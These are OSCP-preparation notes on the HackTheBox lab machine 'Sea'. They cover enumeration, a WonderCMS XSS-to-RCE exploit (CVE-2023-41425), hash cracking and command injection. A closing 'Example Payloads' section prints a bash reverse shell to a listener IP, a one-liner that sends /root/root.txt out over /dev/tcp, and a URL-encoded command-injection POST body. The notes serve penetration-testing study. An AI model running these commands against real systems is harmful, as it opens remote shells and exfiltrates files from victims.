# Sea (HTB) - OSCP Preparation Notes

## Overview
Sea is an Easy Linux machine on HackTheBox that demonstrates a real-world attack chain: web enumeration, exploiting a WonderCMS XSS-to-RCE (CVE-2023-41425), password hash extraction and cracking, and privilege escalation via command injection. This box is excellent OSCP prep because it covers:
- Enumeration (web, files, services)
- Exploiting web vulnerabilities (XSS, RCE)
- Cracking password hashes
- Privilege escalation via command injection
- Using unstable shells and alternative exfiltration methods

## Key Takeaways
- **Enumeration is critical:** Use nmap, ffuf, and manual browsing to discover services, files, and CMS versions.
- **Vulnerability research:** Always check the version of discovered software for public exploits/CVEs.
- **Exploit adaptation:** PoCs may need modification (e.g., changing URLs, payloads, or hosting your own files).
- **Unstable shells:** Web-based RCE often gives unstable shells. Be ready to:
  - Upgrade shells (pty, stty, etc.)
  - Use direct exfiltration (cat flag to listener or file)
  - Run commands quickly before the shell dies
- **Password hash cracking:** Extract hashes, clean them up, and use hashcat/john with the right mode and wordlist.
- **Privilege escalation:** Always check for internal services, custom apps, and injection points. Try command injection in any field that interacts with the system.

## Attack Walkthrough
1. **Enumeration:**
   - nmap to find open ports (22/ssh, 80/http)
   - ffuf to find /themes, /themes/bike, and sensitive files (README.md, version)
   - Identify WonderCMS 3.2.0
2. **Vulnerability Research:**
   - Find CVE-2023-41425 (XSS to RCE in WonderCMS)
   - Download/adapt public PoC
3. **Exploitation:**
   - Host malicious main.zip (with revshell) and xss.js
   - Use exploit.py to generate XSS link and serve files
   - Wait for admin to trigger XSS, uploading shell and getting reverse shell
   - If shell is unstable, use direct exfiltration (cat /root/root.txt to listener or file)
4. **Post-Exploitation:**
   - Find WonderCMS database.js, extract and clean bcrypt hash
   - Crack with hashcat (-m 3200, rockyou.txt)
   - Enumerate users, su to amay with cracked password
   - SSH port forward 8080 for internal web app
   - Find command injection in log_file parameter
   - Use command injection for root shell or direct flag exfiltration

## Practical OSCP Lessons
- Always try multiple payloads and methods if a shell is unstable
- Use URL encoding for all payloads in web requests
- If you can't get a shell, exfiltrate data directly (cat flag to listener or file)
- Privilege escalation often involves custom scripts or web apps—test all input fields
- Document every step and command for reporting and review

## Example Payloads
- **Reverse shell (bash):**
  `bash -c 'bash -i >& /dev/tcp/10.10.14.11/4444 0>&1'`
- **Direct flag exfiltration:**
  `bash -c 'cat /root/root.txt >& /dev/tcp/10.10.14.11/4444 0>&1'`
- **URL-encoded for POST:**
  `log_file=%2Fvar%2Flog%2Fapache2%2F;bash+-c+'cat+/root/root.txt+>%26+/dev/tcp/10.10.14.11/4444+0>%261'&analyze_log=`

## Why This Matters for OSCP
- Real-world boxes rarely go as planned—be flexible and creative
- You may need to chain multiple vulnerabilities
- Unstable shells are common; always have a backup plan
- Exfiltrating flags or data directly is a valid and sometimes necessary technique
- Practice, documentation, and persistence are key to success

---

**Review these notes before your OSCP exam to remind yourself of enumeration, exploitation, and privilege escalation strategies, especially when dealing with unstable shells or web-based RCE!**
